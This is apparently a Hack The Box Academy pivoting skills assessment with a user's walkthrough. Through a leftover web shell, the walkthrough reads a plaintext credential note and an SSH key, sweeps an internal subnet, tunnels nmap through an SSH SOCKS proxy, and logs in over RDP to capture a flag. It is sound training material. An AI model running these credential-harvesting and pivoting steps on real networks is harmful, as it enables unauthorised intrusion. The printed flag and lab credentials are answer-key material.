# Skills Assessment

### Scenario

A team member started a Penetration Test against the Inlanefreight environment but was moved to another project at the last minute. Luckily for us, they left a `web shell` in place for us to get back into the network so we can pick up where they left off. We need to leverage the web shell to continue enumerating the hosts, identifying common services, and using those services/protocols to pivot into the internal networks of Inlanefreight. Our detailed objectives are `below`:

***

### Objectives

* Start from external (`Pwnbox or your own VM`) and access the first system via the web shell left in place.
* Use the web shell access to enumerate and pivot to an internal host.
* Continue enumeration and pivoting until you reach the `Inlanefreight Domain Controller` and capture the associated `flag`.
* Use any `data`, `credentials`, `scripts`, or other information within the environment to enable your pivoting attempts.
* Grab `any/all` flags that can be found.

**Note:**

Keep in mind the tools and tactics you practiced throughout this module. Each one can provide a different route into the next pivot point. You may find a hop to be straightforward from one set of hosts, but that same tactic may not work to get you to the next. While completing this skills assessment, we encourage you to take proper notes, draw out a map of what you know of already, and plan out your next hop. Trying to do it on the fly will prove `difficult` without having a visual to reference.

***

### Connection Info

`Foothold`:

`IP`:

You will find the web shell pictured below when you browse to support.inlanefreight.local or the target IP above.

![text](https://academy.hackthebox.com/storage/modules/158/webshell.png)

\


Note: When spawning your target, we ask you to wait for 3 - 5 minutes until the whole lab with all the configurations is set up so that the connection to your target works flawlessly.

## Walkthrough

```bash
#target machine
cat /home/webadmin/for-admin-eyes-only
#note to self,
#user:mlefay
#password:Plain Human work!
cat /home/webadmin/id_rsa # its in webadmin folder, copy then try to ssh with it
#kali
vim id_rsa
chmod 600 id_rsa
ssh -i id_rsa webadmin@10.129.229.129
```

now lets enumerate

```bash
history #we found lot of things here
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
#64 bytes from 172.16.5.15: icmp_seq=1 ttl=64 time=0.023 ms
#64 bytes from 172.16.5.35: icmp_seq=1 ttl=128 time=1.29 ms
```

now lets pivot from that machine

```bash
ssh -D 9050 -i id_rsa webadmin@10.129.229.129
#kali
proxychains nmap 172.16.5.35 -sV
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH for_Windows_8.9 (protocol 2.0)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

now lets enumerate further

```bash
proxychains nmap -sV -sC -p22,139,3389,445,135 172.16.5.35
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH for_Windows_8.9 (protocol 2.0)
| ssh-hostkey: 
|   256 0e:29:c7:ed:0b:4c:80:87:a7:89:3f:b0:45:59:d9:17 (ECDSA)
|_  256 f3:e7:0b:01:fa:ac:9c:5b:fa:9c:0e:79:10:6c:9d:1f (ED25519)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2024-02-27T12:10:08+00:00; +3s from scanner time.
| ssl-cert: Subject: commonName=PIVOT-SRV01.INLANEFREIGHT.LOCAL
| Not valid before: 2024-02-26T11:33:16
|_Not valid after:  2024-08-27T11:33:16
| rdp-ntlm-info: 
|   Target_Name: INLANEFREIGHT
|   NetBIOS_Domain_Name: INLANEFREIGHT
|   NetBIOS_Computer_Name: PIVOT-SRV01
|   DNS_Domain_Name: INLANEFREIGHT.LOCAL
|   DNS_Computer_Name: PIVOT-SRV01.INLANEFREIGHT.LOCAL
|   DNS_Tree_Name: INLANEFREIGHT.LOCAL
|   Product_Version: 10.0.17763
|_  System_Time: 2024-02-27T12:09:54+00:00
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 3s, deviation: 0s, median: 2s
| smb2-time: 
|   date: 2024-02-27T12:09:55
|_  start_date: N/A
```

lets login to rdp

```bash
proxychains xfreerdp /v:172.16.5.35 /u:mlefay /p:'Plain Human work!' /cert-ignore /dynamic-resolution
type C:\flag.txt
S1ngl3-Piv07-3@sy-Day
#in cmd
ipconfig
#IPv4 Address. . . . . . . . . . . : 172.16.6.35
#Subnet Mask . . . . . . . . . . . : 255.255.0.0
```
